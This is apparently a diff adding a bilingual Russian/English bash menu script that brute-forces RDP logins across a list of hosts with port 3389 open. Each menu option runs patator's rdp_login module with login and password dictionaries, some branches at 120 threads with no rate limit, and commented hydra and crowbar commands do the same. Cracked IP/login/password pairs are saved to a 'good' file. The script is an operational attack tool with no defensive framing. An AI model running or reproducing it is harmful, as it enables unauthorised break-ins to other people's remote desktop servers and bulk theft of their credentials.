+#####################################MAINBRUTEMENURU##################################
+MAINBRUTEMENURU ()
+{
+echo ""
+echo -e "$green                                         Выбрать метод перебора..$colorbase"
+echo -e "                +-----------------------------------------------------------------------+"
+echo -e "                |        $grey 1.$yellow Ввести 1 логин и указать путь к файлу с паролями.$colorbase          |"; 
+echo -e "                |        $grey 2.$yellow Указать путь к файлу с логинами и ввести 1 пароль.$colorbase         |";
+echo -e "                |        $grey 3.$yellow Указать путь к файлам с логинами и паролями.$colorbase               |";
+echo -e "                |        $grey 4.$yellow Приступить к перебору методом по умолчанию.$colorbase                |";
+echo -e "                |        $grey 5.$yellow Перейти в Главное меню.$colorbase                                    |";
+echo -e "                |        $red         Нажмите $aquamarine[Enter]$red для выхода из скрипта$colorbase                 |"
+echo -e "                +-----------------------------------------------------------------------+"
+read -p "                                             Выбор из меню : " brutmenu
+
+if [ "$brutmenu" = "1" ]; then
+echo -e "$aquamarine*******************************************************************************$green"
+BRUTMENU1 (){
+read -p "*Введите логин {administrator, admin & etc.} : " loginbrute
+read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
+}
+while BRUTMENU1
+do
+if [[ -z $loginbrute || ! -s $passlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями$green"
+else
+break
+echo ""
+fi
+done
+
+
+clear
+echo -e "                                            $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
+
+
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1  0=open3389 1=$passlist -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
+#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTRU
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "2" ]; then
+echo -e "$aquamarine***************************************************************************************************$green"
+BRUTMENU2 (){
+read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
+read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
+}
+while BRUTMENU2
+do
+if [[ -z $passbrute || ! -s $loginlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами$green"
+else
+break
+echo ""
+fi 
+done
+
+clear
+echo -e "                                            $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
+#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTRU
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+if [ "$brutmenu" = "3" ]; then
+echo -e "$aquamarine****************************************************************************************************$green"
+BRUTEMENU3 () {
+read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
+read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
+}
+while BRUTEMENU3
+do
+if [[ ! -s $passlist || ! -s $loginlist ]]; then
+echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями$green"
+else
+break
+echo ""
+fi
+done
+
+clear
+echo -e "                                            $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2  0=open3389 1=$loginlist 2=$passlist -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
+#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTRU
+echo -e "$red Файл с целями пустой$colorbase"
+sleep 2
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "4" ]; then
+
+clear
+echo -e "                                            $green Запуск брутфорса"
+echo ""
+echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
+echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass 3=$port -t 120  --rate-limit=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $PWD/users  -C $PWD/dict/pass -S $PWD/open 
+#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+echo ""
+clear
+TESTRESULTRU
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+if [ "$brutmenu" = "5" ]; then
+echo ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+}
+######################################################################################
+#####################################MAINBRUTEMENUEN##################################
+MAINBRUTEMENUEN ()
+{
+echo ""
+echo -e "$green                                                Select method$colorbase"
+echo -e "                 +-----------------------------------------------------------------------+"
+echo -e "                 |    $grey 1.$yellow Enter the login and enter the path to passwords dictionary$colorbase     |"; 
+echo -e "                 |    $grey 2.$yellow Enter the path to logins dictionary and enter the password$colorbase     |";
+echo -e "                 |    $grey 3.$yellow Enter the path to dictionaries with logins and  passwords$colorbase      |";
+echo -e "                 |    $grey 4.$yellow Proceed to the brute force method by default$colorbase                   |";
+echo -e "                 |    $grey 5.$yellow Return to Main menu$colorbase                                            |";
+echo -e "                 |                        $red Press $aquamarine[Enter]$red to exit$colorbase                         |";
+echo -e "                 +-----------------------------------------------------------------------+"
+read -p "                                             Сhoose from a menu : " brutmenu
+
+if [ "$brutmenu" = "1" ]; then
+echo -e "$aquamarine*******************************************************************************$green"
+BRUTMENUEN1 () {
+read -p "*Enter username {administrator, admin & etc.} : " loginbrute
+read -p "*Enter the path to the file with a list of passwords {dict/john}: " passlist
+}
+while BRUTMENUEN1
+do
+if [[ -z $loginbrute || ! -s $passlist ]]; then
+echo -e "\n$red***ERROR! Incorrect login or password file$green"
+else
+break
+echo ""
+fi
+done
+
+clear
+echo -e "                                          $green Start bruteforceing"
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
+echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
+
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
+#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTEN
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "2" ]; then
+echo -e "$aquamarine*******************************************************************************$green"
+BRUTEMENUEN2 () {
+read -p "*Enter the path to username dictionary {dict/users}: " loginlist
+read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
+}
+while BRUTEMENUEN2
+do
+if [[ ! -s $loginlist || -z $passbrute ]];
+then
+echo -e "\n$red***ERROR! Incorrect file with login and password unknown$green"
+else
+break
+echo ""
+fi
+done
+
+clear
+echo -e "                                           $green Start bruteforceing"
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
+#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTEN
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+
+if [ "$brutmenu" = "3" ]; then
+echo -e "$aquamarine*******************************************************************************$green"
+BRUTEMENU3 () {
+read -p "*Enter the path to username dictionary {dict/users}: " loginlist
+read -p "*Enter the path to passwords dictionary {dict/john}: " passlist
+}
+while BRUTEMENU3
+do
+if [[ ! -s $loginlist || ! -s $passlist ]]; then
+echo -e "\n$red***ERROR! Incorrect file with logins and passwords file$green"
+else
+break
+echo ""
+fi
+done
+
+clear
+echo -e "                                           $green Start bruteforceing"
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
+#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTEN
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
+if [ "$brutmenu" = "4" ]; then
+clear
+echo -e "                                           $green Start bruteforceing"
+echo ""
+echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
+echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
+echo ""
+
+python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
+#python crowbar.py -b rdp -U $PWD/users -C $PWD/dict/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
+#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+clear
+TESTRESULTEN
+echo -e "\n$red***ERROR! File for targets is empty "
+echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase"
+read -p ""
+
+./rdp_brute.sh
+fi
+
+if [ "$brutmenu" = "5" ]; then
+echo ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+}
+
+######################################TESTRESULTRU#######################################
+TESTRESULTRU ()
+{
+clear
+cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
+	cat all_results
+	echo ""
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+	echo ""
+	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
+	echo ""
+	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+ 
+ echo -e ""
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
+########################################################################################
+######################################TESTRESULTEN######################################
+TESTRESULTEN ()
+{
+clear
+cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
+        cat all_results
+ echo -e "$colorbase                          +-------------------------+"
+ echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
+ echo -e           "                          +-------------------------+$red"
+ echo -e ""
+ echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+	else
+ echo -e "$colorbase                                      +-----------------------------+"
+ echo -e "$colorbase                                      |$red Login/Password not found :( $colorbase|";
+ echo -e           "                                      +-----------------------------+$red"
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
+#######################################CHECKFILERU######################################
+CHECKFILERU ()
+{
+if [ -s open3389 ]
+	then
+ echo ""
+	else
+ echo -e "$colorbase                                       +-------------------------+"
+ echo -e "$colorbase                                       |$red Открытых RDP не найдено $colorbase|";
+ echo -e           "                                       +-------------------------+$red"
+ echo -e ""
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+}
+########################################################################################
+
+#######################################CHECKFILEEN######################################
+CHECKFILEEN ()
+{
+if [ -s open3389 ]
+	then
+ echo ""
+	else
+ echo -e "$colorbase                                        +-------------------------+"
+ echo -e "$colorbase                                        |$red    Open Rdp not found $colorbase  |";
+ echo -e           "                                        +-------------------------+$red"
+ echo -e ""
+echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+}
+#####################################################################################
+CHECKLANGUAGE
